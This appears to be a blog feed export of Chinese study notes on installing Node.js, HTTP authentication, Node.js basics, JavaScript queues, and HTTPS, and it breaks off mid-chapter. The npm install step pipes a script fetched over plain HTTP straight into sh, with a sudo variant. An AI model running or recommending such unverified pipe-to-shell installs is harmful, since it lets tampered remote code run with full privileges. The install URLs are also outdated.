    <content type="text"><![CDATA[安装和配置 Node.js下载安装还是挺简单的，点击NodeJs，找到download 和 与计算机对应的操作系统进行下载安装即可。 编译源代码Node.js 从 0.6 版本开始已经实现了源代码级别的跨平台，因此我们可以使用不同的编译命令将同一份源代码的基础上编译为不同平台下的原生可执行代码。在编译之前，要先获取源码包。建议访问http://nodejs.org，点击Download链接，然后选择Source Code，下载正式发布的源码包。如果你需要开发中的版本，可以通过https://github.com/joyent/node/zipball/master 获得，或者在命令行下输入 git clone git://github.com/joyent/node.git 从git获得最新的分支。 在 Windows系统中编译Node.js 在 Windows 下只能通过 Microsoft Visual Studio 编译，因此你需要首先安装 VisualStudio 或者免费的 Visual Studio Express。你还需要安装 Python 2（2.5以上的版本，但要小于3.0），可以在http://python.org/取得。安装完 Python 以后请确保在 PATH 环境变量中添加python.exe 所在的目录，如果没有则需要手动在“系统属性”中添加。一切准备好以后，打开命令提示符，进入 Node.js 源代码所在的目录进行编译： C:\Users\byvoid\node-v0.6.12&gt;vcbuild.bat release[‘-f’, ‘msvs’, ‘-G’, ‘msvs_version=2010’, ‘.\node.gyp’, ‘-I’, ‘.\common.gypi’, ‘–depth=.’,’-Dtarget_Project files generated. C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Microsoft.CppBuild.targets(1151,5):warning MSB8012: http_parser.vcxproj -&gt; C:\Users\byvoid\node-v0.6.12\Release\http_parser.libjs2c, and also js2c_experimental node_js2c… 直接运行 node.exe 即可进入 Node.js 的交互模式，在系统 PATH 环境变量中添加node.exe文件所在的目录，这样就可以在命令行中运行 node 命令了，剩下的工作就是手动安装 npm 了。 安装 Node 包管理器Node 包管理器（npm）是一个由 Node.js 官方提供的第三方包管理工具.npm 是一个完全由 JavaScript 实现的命令行工具，通过 Node.js 执行，因此严格来讲它不属于 Node.js 的一部分。我们在 Windows、Mac 上安装包和源代码包时会自动同时安装 npm。 http://npmjs.org/提供了 npm 几种不同的安装方法，通常你只需要执行以下命令： curl http://npmjs.org/install.sh | sh 如果安装过程中出现了权限问题，那么需要在 root 权限下执行上面的语句，或者使用 sudo 。 curl http://npmjs.org/install.sh | sudo sh 其他安装方法，譬如从 git 中获取 npm 的最新分支，可以参考 http://npmjs.org/doc/README.html上的说明。 另外还可以上菜鸟编程查看安装配置方法，简单明了。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第八章）—— 确认访问用户身份的认证]]></title>
    <url>%2F2018-09-12-read-%E5%9B%BE%E8%A7%A3HTTP-Part8.html</url>
    <content type="text"><![CDATA[由于有些事情所以补休，这段时间就没有怎么看这本书，今天趁着后台接口有问题，后台又还没有来，忙里偷闲，读多一章。 某些 Web 页面只想让特定的人浏览，或者干脆仅本人可见。为达到这个目标，必不可少的就是认证功能 第八章 确认访问用户身份的认证何为认证计算机本身无法判断坐在显示器前的使用者的身份。所以一般需要核对 “登录者本人才知道的信息”、“登录者本人才会有的信息”。 核对的信息通常是指一下这些。 密码：只有本人才会知道的字符串信息。 动态令牌：仅限本人持有的设备内显示的一次性密码。 数字证书：仅限本人（终端）持有的信息。 生物认证：指纹和虹膜等本人的生理信息。 IC 卡等：仅限本人持有的信息。 但是，即便对方是假冒的，只要能通过用户认证，那么计算机就会默认出自本人的行为。因此，掌握机密信息的密码绝不能让他人得到，更不能轻易就被破解出来。 HTTP 使用的认证方式 HTTP/1.1 使用的认证方式如下所示。 BASIC 认证（基本认证） DIGEST 认证（摘要认证） SSL 客户端认证 FormBase 认证（基于表单认证） 此外，还有 Windows 统一认证（Keberos 认证、NTLM 认证） BASIC 认证BASIC 认证是从 HTTP/1.0 就定义的认证方式。即便是现在仍有一部分网站会使用这种认证方式，是 Web 服务器与通信客户端之间进行的认证方式。 BASIC 认证的认证步骤 步骤1： 当请求的资源需要 BASIC 认证时，服务器会随状态码401 Authorization Required ，返回带 WWW-Authenticate 首部字段的响应。该字段内包含认证的方式（BASIC）及 Request-URI 安全域字符串（realm） 步骤2： 接受到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者之间用冒号（：）连接后，再经过 Base64 编码处理。 假设用户 ID 为 guest ，密码也是，连接起来就是 guest: guest 这样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后，发送请求。 当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后，浏览器会自动完成到 Base64 编码的转换工作。 步骤3：接收到包含首部字段 Authorization 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程中，如果被人窃听，被盗的可能性极高。 另外，除此之外想再进行一次 BASIC 认证时，一般的浏览器却无法实现认证注销操作，这也是问题之一。BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。 DIGEST 认证为了弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。DIGEST 认证同样使用质询/ 响应的方式（challenge/response）,但不会像 BASIC 认证那样直接发送明文密码。 所谓的质询响应方式是指，一开始一方会发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。 因此发送给对方的只是响应摘要及由质询码产生的计算结果，所以比起 BASIC 认证，密码泄露的可能性就降低了。 DIGEST 认证的认证步骤 步骤1：请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。该字段内包含质问响应方式认证所需要的临时质询码（随机数，nonce）.首部字段 WWW-Authenticate 内必须包含 realm 和 nonce 这两个字段的信息。客户端就是依靠向服务器回送这两个值进行认证的。 nonce 是一种每次返回的 401 响应生成的随机字符串。该字符串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依赖服务器的具体实现。 步骤2：接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。 首部字段 Authorization 内必须包含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce 就是之前从服务器接收到的响应中的字段。 username 是 realm 限定范围内可认证的用户名。 uri（digest-uri） 即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。 response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符串，形成响应码。 步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会确认认证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。 DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。 DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也有所受限。 SSL 客户端认证从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确，即可认证是本人的行为。但如果用户 ID 和密码被盗，就很有可能被第三者冒充。利用 SSL 客户端认证则可以避免该情况的发生。SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端。 SSL 客户端认证的认证步骤为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。 步骤 1： 接收到需要认证资源的请求，服务器会发送 CertificateRequest 报文，要求客户端提供客户端证书。 步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。 步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。 SSL 客户端认证采用双因素认证在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证组合形成一种双因素认证（Two-factorauthentication）来使用。所谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。 换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为。 通过双因素认证后，就可以确认是用户本人正在使用匹配正确的计算机访问服务器。 SSL 客户端认证必要的费用使用 SSL 客户端认证需要用到客户端证书。而客户端证书需要支付一定费用才能使用。 这里提到的费用是指，从认证机构购买客户端证书的费用，以及服务器运营者为保证自己搭建的认证机构安全运营所产生的费用。 每个认证机构颁发客户端证书的费用不尽相同，平摊到一张证书上，一年费用约几万至十几万日元。服务器运营者也可以自己搭建认证机构，但要维持安全运行就会产生相应的费用。 基于表单认证基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不相同。 多数情况下，输入已事先登录的用户 ID（通常是任意字符串或邮件地址）和密码等登录信息后，发送给 Web 应用程序，基于认证结果来决定认证是否成功。 认证多半为基于表单认证由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认证和 DIGEST 认证几乎不怎么使用。另外，SSL 客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。 比如 SSH 和 FTP 协议，服务器与客户端之间的认证是合乎标准规范的，并且满足了最基本的功能需求上的安全使用级别，因此这些协议的认证可以拿来直接使用。但是对于 Web 网站的认证功能，能够满足其安全使用级别的标准规范并不存在，所以只好使用由 Web 应用程序各自实现基于表单的认证方式。 不具备共同标准规范的表单认证，在每个 Web 网站上都会有各不相同的实现方式。如果是全面考虑过安全性能而实现的表单认证，那么就能够具备高度的安全等级。但在表单认证的实现中存在问题的 Web网站也是屡见不鲜。 Session 管理及 Cookie 应用基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session （会话）。 基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。 但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理Session，以弥补 HTTP 协议中不存在的状态管理功能。 步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS通信来进行 HTML 表单画面的显示和用户输入数据的发送。 步骤 2： 服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。 向客户端返回响应时，会在首部字段 Set-Cookie 内写入 SessionID（如 PHPSESSID=028a8c…）。 你可以把 Session ID 想象成一种用以区分不同用户的等位号。 然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。 另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie内加上 httponly 属性。 步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。 另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。通常，一种安全的保存方法是，先利用给密码加盐（salt）的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。 salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手中的密码特征库进行破解 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— 简介]]></title>
    <url>%2F2018-09-13-NodeJs-Part1.html</url>
    <content type="text"><![CDATA[心心念念要学习的nodejs从今天开始，读 《node.js开发指南》，进行学习记录总结。 Node.js，或者 Node，是一个可以让 JavaScript 运行在服务器端的平台。它可以让JavaScript 脱离浏览器的束缚运行在一般的服务器环境下，就像运行 Python、Perl、PHP、Ruby程序一样。你可以用 Node.js 轻松地进行服务器端应用开发，Python、Perl、PHP、Ruby 能做的事情 Node.js 几乎都能做，而且可以做得更好。 Node.js 是一个为 实时 Web（Real-time Web）应用开发而诞生的平台，它从诞生之初就充分考虑了在实时响应、超大规模数据要求下架构的可扩展性。这使得它摒弃了传统平台依靠多线程来实现高并发的设计思路，而采用了单线程、异步式I/O、事件驱动式的程序设计模型。这些特性不仅带来了巨大的性能提升，还减少了多线程程序设计的复杂性，进而提高了开发效率。 尽管它诞生的时间（2009年）还不长，但它的周围已经形成了一个庞大的生态系统。Node.js 有着强大而灵活的 包管理器 （node package manager，npm），目前已经有上万个第三方模块，其中有网站开发框架，有 MySQL、PostgreSQL、MongoDB 数据库接口，有模板语言解析、CSS 生成工具、邮件、加密、图形、调试支持，甚至还有图形用户界面和操作系统 API工具。 Node.js简介Node.js 是什么Node.js 不是一门独立的语言，也不是一个 JavaScript 框架，也不是一个浏览器端的库。Node.js 是一个让 JavaScript 运行在服务器端的开发平台，它让 JavaScript 成为脚本语言的一等公民，在服务端堪与 PHP、Python、Perl、Ruby 平起平坐。 Node.js 是一个划时代的技术，它在原有的 Web 前端和后端技术的基础上总结并提炼出了许多新的概念和方法，堪称是十多年来 Web 开发经验的集大成者。Node.js 可以作为服务器向用户提供服务，与 PHP、Python、Ruby on Rails 相比，它跳过了 Apache、Nginx 等 HTTP服务器，直接面向前端开发。Node.js 的许多设计理念与经典架构（如 LAMP）有着很大的不同，可提供强大的伸缩能力，以适应21世纪10年代以后规模越来越庞大的互联网环境。 Node.js 与 JavaScript传统意义上，JavaScript 是由 ECMAScript、文档对象模型（DOM）和浏览器对象模型（BOM）组成的，而 Mozilla 则指出 JavaScript 由Core JavaScript 和 Client JavaScript 组成。 Node.js 中所谓的 JavaScript 只是 Core JavaScript，或者说是 ECMAScript 的一个实现，不包含 DOM、BOM 或者 Client JavaScript。这是因为 Node.js 不运行在浏览器中，所以不需要使用浏览器中的许多特性。 Node.js 是一个让 JavaScript 运行在浏览器之外的平台。它实现了诸如文件系统、模块、包、操作系统 API、网络通信等 Core JavaScript 没有或者不完善的功能。 随着 Node.js 的成功，各种浏览器外的 JavaScript 实现逐步兴起，因此产生了 CommonJS 规范。CommonJS 试图拟定一套完整的 JavaScript 规范，以弥补普通应用程序所需的 API，譬如文件系统访问、命令行、模块管理、函数库集成等功能。CommonJS 制定者希望众多服务端 JavaScript 实现遵循CommonJS 规范，以便相互兼容和代码复用。Node.js 的部份实现遵循了CommonJS规范，但由于两者还都处于诞生之初的快速变化期，也会有不一致的地方。 Node.js 的 JavaScript 引擎是 号称是目前世界上最快——的 JavaScript 引擎V8。 Node.js 能做什么使用 Node.js 可以开发： 具有复杂逻辑的网站 基于社交网络的大规模 Web 应用 Web Socket 服务器 TCP/UDP 套接字应用程序 命令行工具 交互式终端程序 带有图形用户界面的本地应用程序 单元测试工具 客户端 JavaScript 编译器 Node.js 内建了 HTTP 服务器支持，也就是说你可以轻而易举地实现一个网站和服务器的组合。Node.js 还可以部署到非网络应用的环境下，比如一个命令行工具。Node.js 还可以调用C/C++ 的代码，这样可以充分利用已有的诸多函数库，也可以将对性能要求非常高的部分用C/C++ 来实现。 异步式 I/O 与事件驱动Node.js 最大的特点就是采用异步式 I/O 与事件驱动的架构设计。对于高并发的解决方案，传统的架构是多线程模型，也就是为每个业务逻辑提供一个系统线程，通过系统线程切换来弥补同步式 I/O 调用时的时间开销。Node.js 使用的是单线程模型，对于所有 I/O 都采用异步请求方式，避免了频繁的上下文切换。Node.js 在执行的过程中会维护一个时间队列，程序 在执行时进入时间循环等待下一个事件到来，每个异步式请求完成后会被推送到事件队列，等待程序进程进行处理。 例如对于简单而常见的数据库查询操作，按照传统方式实现的代码如下： 12res = db.query('SELECT * from some_table')res.output(); 以上代码在执行到第一行的时候，线程会堵塞，等待数据库返回查询结果，然后再继续处理。然而，由于数据库查询可能涉及磁盘读写和网络通信，其延时可能相当大（长达几个到几百毫秒，相比CPU的时钟差了好几个数量级），线程会在这里阻塞等待结果返回，对于高并发的访问，一方面线程长期阻塞等待，另一方面为了应付新请求而不断新增加线程，因此会浪费大量系统资源，同时线程的增多也会占用大量的 CPU 时间来处理内存上下文切换，而且还容易遭受低速连接攻击。 看看 Nodejs 是如何解决这个问题的。 123db.query('SELECT * from some_table',fucntion(res)&#123; res.output(); &#125;) 这段代码中，db.query 的第二个参数是一个回调函数。进程在执行到 db.query 的时候，不会有结果返回，而是直接继续执行后面的语句，知道进入时间循环。当数据库查询结果返回时，会将事件发送到事件队列，等到线程进入事件循环以后，才会调用之前的回调函数继续执行后面的逻辑。 Node.js 的异步机制是基于时间，所有的磁盘I/O、网络通信、数据库查询都以非阻塞的方式请求，返回的结果由事件循环来处理。 这样的好处是，CPU 和内存在同一时间集中处理一件事，同时尽可能让耗时的I/O 操作并行执行。对于低速连接攻击，Node.js 只是在事件队列中增加请求，等待操作系统的回应，因此不会有任何多线程开销，很大程度上可以提升 Web 应用的健壮性，防止恶意攻击。 这种异步事件模式的弊端也是显而易见的，因为它不符合开发者的常规线性思路，往往需要把一个完整的逻辑拆分成一个个事件，增加了开发和调试的难度。针对这个问题，Node.js第三方模块提出了很多解决方案，会在后面第六部分详细讨论。 Node.js 的性能Node.js 除了使用 V8 作为JavaScript引擎以外，还使用了高效的 libev 和 libeio 库支持事件驱动和异步式 I/O。 CommonJS正如当年为了统一 JavaScript 语言标准，人们制定了 ECMAScript 规范一样，如今为了统一 JavaScript 在浏览器之外的实现，CommonJS 诞生了。CommonJS 试图定义一套普通应用程序使用的 API，从而填补 JavaScript 标准库过于简单的不足。CommonJS 的最终目标是制定一个像 C++ 标准库一样的规范，使得基于 CommonJS API 的应用程序可以在不同的环境下运行，就像用 C++ 编写的应用程序可以使用不同的编译器和运行时函数库一样。为了保持中立，CommonJS 不参与标准库实现，其实现交给像 Node.js 之类的项目来完成。 CommonJS 规范包括了模块（modules）、包（packages）、系统（system）、二进制（binary）、控制台（console）、编码（encodings）、文件系统（filesystems）、套接字（sockets）、单元测试（unit testing）等部分]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第四章）—— 队列]]></title>
    <url>%2F2018-08-31-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part4.html</url>
    <content type="text"><![CDATA[有两种结构类似于数组，但在添加和删除元素时更加可控，它们就是栈和队列。 第四章 队列队列数据结构队列是遵循FIFO（First In First Out，先进先出，也称为先来先服务）原则的一组有序的项。队列在尾部添加新元素，并从顶部移除元素。最新添加的元素必须排在队列的末尾。 现实中，很常见的例子就是排队。在计算机科学里面是打印队列。 创建队列我们需要创建自己的类来表示一个队列，先从最基本的声明开始： 123function Queue()&#123; // 这里是属性和方法&#125; 首先需要一个用于存储队列中元素的数据结构。我们可以使用数组，就像上一章 Stack 类中那样使用（你会发现其实两者很相似，只是添加和移除元素不一样而已。） 1let items = [] 接下来需要声明一些队列可用的方法。 enqueue（element（s））:向队列尾部添加一个（或多个）新的项。 dequeue（）：移除队列中的第一个（排列在队伍最前面的）项，并返回被移除的元素 front（）：返回队列中的第一个元素——最先被添加，也将是最先被移除的元素。队列不做任何变动（不移除元素，只返回元素信息——与 Stack 类的 peek 方法非常相似） isEmpty（）：如果队列中不包含任何元素，返回 ture，否则返回 false size（）:返回队列包含的元素个数，与数组的 length 属性类似。 向队列添加元素首先要实现的是 enqueue 方法。这个方法负责向队列中添加新元素，还有一个非常重要的细节，新的项目只能添加到队列末尾： 123this.enqueue = function(element)&#123; return items.push(element);&#125;; 从队列中移除元素接下来就是 dequeue 方法，这个方法负责从队列中移除项。由于队列遵循先进先出原则，最先添加的项也是要最先被移除的。数组中的 shift 方法会从数组中移除存储在索引0（第一个位置）的元素。 123this.dequeue = function(element)&#123; return items.shift();&#125; 只有 enqueue 方法和 dequeue 方法可以添加和移除元素，这样就确保了 Queue 类遵循先进先出的原则。 查看队列头元素为我们类实现一些额外的辅助方法。我们想知道队列最前面是什么，可以使用 front 方法查看 123this.front = function()&#123; return items[0];&#125; 检查队列是否为空123this.isEmpty = function()&#123; return items.length == 0;&#125; 查看队列的长度123this.size = function()&#123; return items.length;&#125; 打印队列元素123this.print = function()&#123; console.log(items.toString());&#125; 实例1234567891011121314151617181920212223242526272829303132333435function Queue()&#123; let items = []; this.enqueue = function(element)&#123; return items.push(element); &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125;&#125;let queue = new Queue(); // 新建 类 Queue 的实例 queue console.log(queue.isEmpty()); // 队列没有元素，返回 truequeue.enqueue(5); // 先队列中加 5queue.enqueue(8); // 先队列中加 8queue.dequeue(); // 减去队列的开头console.log(queue.front()); // 8queue.enqueue(11); // 先队列中加 11console.log(queue.size()); // 队列的长度 2console.log(queue.isEmpty()); // 队列有元素，返回 falsequeue.enqueue(15); // 先队列中加 15queue.print(); // 输出队列中的元素 8,11,15 使用ES6 语法实现的 Queue 类我们使用一个 WeakMap 来保存私有属性items，并用外层函数（闭包）来封装 Queue 类。 1234567891011121314151617181920212223242526272829303132333435363738let Queue = (function()&#123;const items = new WeakMap(); // 声明了一个 WeakMap 类型的变量 itemsclass Queue&#123; constructor()&#123; items.set(this, []) // 在 constructor 中，以this（Stack类自己引用）为键，把代表栈的数组存入 items &#125; enqueue(element)&#123; let q = items.get(this); q.push(element); &#125; dequeue ()&#123; let q = items.get(this); let r = q.shift(); return r; &#125; front ()&#123; let q = items.get(this); return q[0]; &#125; isEmpty ()&#123; let q = items.get(this); return q.length == 0; &#125; size ()&#123; let q = items.get(this); let r = q.length return r; &#125; clear ()&#123; items.set(this, []) &#125; print ()&#123; let q = items.get(this); console.log(q.toString()); &#125;&#125;return Queue;&#125;)(); 优先队列队列大量应用在计算机科学以及我们的生活中，其中一个就是优先队列。元素的添加和移除是基于优先级的。现实中的例子就是登机的顺序。头等舱和商务舱的乘客优先级要优于经济舱乘客。 另外一个现实的例子就是医院的候诊室。医生会优先处理病情比较严重的患者。 实现一个队列，有两种选项：设置优先级，然后在正确的位置添加元素；或者用入列操作添加元素，然后按照优先级操作它们。在这个实例中，我们会在正确的位置添加元素，因此可以对它们使用默认的出列操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function ProrityQueue()&#123; let items = []; function QueueElement(element, priority)&#123; // 参数包含了添加到队列的元素以及其的优先级 this.element = element; this.priority = priority; &#125; this.enqueue = function(element, priority)&#123; let queueElement = new QueueElement(element, priority); let added = false; // 如果队列为空可以直接将元素插入，否则就要比较元素与该元素的优先级。 // 当找到一个比要添加元素的 priority 值更高（优先级更低）的项时， // 我们就把元素插入它之前，但是如果优先级相同的话就遵循先进先出的原则 for(let i = 0; i &lt; items.length; i++)&#123; if(queueElement.priority &lt; items[i].priority )&#123; items.splice(i,0,queueElement); added = true; break; &#125; &#125; if(!added)&#123; // 如果添加元素的 priority 值大于任何已有的元素，把它添加到队列的末尾就行了 items.push(queueElement); &#125; &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; for(let i = 0; i &lt; items.length; i++)&#123; console.log(`$&#123;items[i].element&#125; - $&#123;items[i].priority&#125;`); &#125; &#125;&#125;let prorityQueue = new ProrityQueue();prorityQueue.enqueue('John',2);prorityQueue.enqueue('Mike',1);prorityQueue.enqueue('Jenny',1);prorityQueue.print(); /* Mike - 1 Jenny - 1 John - 2*/ 循环队列——击鼓传花还有另一个修改版的队列实现，就是循环队列。循环队列的一个例子就是击鼓传花游戏（Hot Potato）。在这个游戏中，孩子们围成一个圆圈，把花尽快地传递给旁边的人，某一时刻传花停止，这个时候，花就在谁的手里，谁就退出圆圈结束游戏。重复这个过程，直到最后一个孩子，就是胜者。 在这个例子中，我们要实现一个模拟的击鼓传花游戏。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function Queue()&#123; let items = []; this.enqueue = function(element)&#123; return items.push(element); &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125;&#125; function hotPotata(nameList, num)&#123; let queue = new Queue(); // 将姓名名单 nameList 逐个加入到队列中 for(let i = 0; i &lt; nameList.length; i++)&#123; queue.enqueue(nameList[i]); &#125; // 给定一个数字，然后迭代队伍，从队列中开头移除一项 // 然后将其添加到队伍的末尾，模拟击鼓传花 // 一旦传递次数达到给定的数字，拿着花的那个人就被淘汰 let eliminated = ''; while(queue.size() &gt; 1)&#123; for(let i = 0; i &lt; num; i++)&#123; queue.enqueue(queue.dequeue()); &#125; eliminated = queue.dequeue(); console.log(eliminated+'在击鼓传花游戏中被淘汰'); &#125; return queue.dequeue();&#125;let names = ['John', 'Jack', 'Camila', 'Ingrid', 'Carl'];let winner = hotPotata(names, 7);console.log('获胜者是'+ winner);// Camila在击鼓传花游戏中被淘汰// John在击鼓传花游戏中被淘汰// Carl在击鼓传花游戏中被淘汰// Jack在击鼓传花游戏中被淘汰// 获胜者是Ingrid 下图模拟了这个输出过程： 可以改变传入 hotPotata 函数的数字，模拟不同的场景。 JavaScript 任务队列当我们在浏览器中打开新标签时，就会创建一个任务队列。这是因为每个标签都是单线程处理所有的任务，它被称为 事件循环。浏览器要负责多个任务，如渲染 HTML ，执行 JavaScript 代码，处理用户交互（用户输入，鼠标点击等），执行和处理异步请求。 小结这一章学习了队列这种数据结构。实现了自己的队列算法，学习了如何通过 enqueue 方法和 dequeue 方法添加和移除元素。还学习了两种非常著名的特殊队列的实现，优先队列和循环队列（使用击鼓传花的实现） 下一章，将学习链表，一种比数组更加复杂的数据结构。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第七章）—— 确保 Web 安全的 HTTPS]]></title>
    <url>%2F2018-08-29-read-%E5%9B%BE%E8%A7%A3HTTP-Part7.html</url>
    <content type="text"><![CDATA[在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用 HTTPS 通信机制可以有效地防止这些问题。本章我们就了解一下 HTTPS。。 第七章 确保 Web 安全的 HTTPSHTTP 的缺点HTTP 主要有这些不足，例如 通信使用明文（不加密），内容可能会被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能已遭到篡改 这些问题不仅在 HTTP 上出现，其他为加密的协议中也会存在这类问题。 除此之外，HTTP 本身还有很多缺点。而且，还有想某些特定的 Web 服务器和特定的 Web 浏览器在实际应用中存在的不足（也可以说成是脆弱性或是安全漏洞）。 通信使用明文可能会被窃听由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP协议通信的请求和响应的内容）进行加密。即， HTTP 报文使用明文（指未经加密的报文）方式发送。 TCP/IP 是可能被窃听的网络 如果要问为什么通信时不加密是一个缺点，这是因为按 TCP/IP 协议族的工作机制，通信内容在所有的通信线路上都有可能遭到窥视。 即使是已经加密处理的通信，也会被窥视到通信内容，这点和未加密的通信是相同的，只是通信如果经过加密，就有可能让人无法破解报文信息的含义，但加密处理后的报文消息本身还是会被看到的。 窃听相同段上的通信并非难事。只需要收集在互联网上流动的数据包（帧）就行了。对于收集来的数据包进行解析工作，就可以获取数据。例如被广泛使用的抓包工具 Wireshark。它可以获取 HTTP 协议的请求和响应的内容，并对其进行解析。像使用 GET 方法发送请求、响应返回了 200 OK，查看 HTTP 响应报文的全部内容等一系列的事情都可以做到。 加密处理防止被窃听 加密技术是可以防止窃听保护消息的一个对策。加密的对象可以有这么几个 通信加密 HTTP 协议中没有加密机制，但可以通过和 SLL（Secure Socket Layer，安全套接层）或者 TLS（Transport Layer Security，安全层传输协议）的组合使用，加密 HTTP 的通信内容。 用 SSL 建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL 组合使用的 HTTP 被称为 HTTPS （HTTP Secure，超文本传输安全协议）或者 HTTP over SSL。 内容的加密 还有一种将参与通信的内容本身加密的方式。由于 HTTP 协议 中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里包含的内容进行加密处理。 在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送请求。 诚然，为了做到有效的内容加密，前提是要求客户端和服务器同时具备加密和解密机制。主要应用在 Web 